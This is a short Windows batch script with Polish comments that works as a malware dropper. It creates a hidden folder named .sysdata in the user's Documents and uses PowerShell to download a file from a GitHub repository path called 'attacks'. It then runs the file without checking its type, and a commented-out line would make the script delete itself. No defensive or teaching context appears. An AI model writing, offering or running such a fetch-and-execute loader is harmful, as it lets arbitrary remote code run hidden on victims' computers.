@echo off
setlocal

:: Pobierz nazwę pliku jako argument (np. update_v2.exe, script.py)
set FILE=%1

:: Folder docelowy (ukryty)
set DEST=%USERPROFILE%\Documents\.sysdata
if not exist "%DEST%" (
    mkdir "%DEST%"
    attrib +h "%DEST%"
)

:: Pobierz plik z internetu
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/%FILE%' -OutFile '%DEST%\%FILE%'"

:: Uruchom bez sprawdzania rozszerzenia
start "" "%DEST%\%FILE%"

:: Usuń plik .bat po 10 sekundach
:: powershell -Command "Start-Sleep -Seconds 10; Remove-Item '%~f0' -Force"
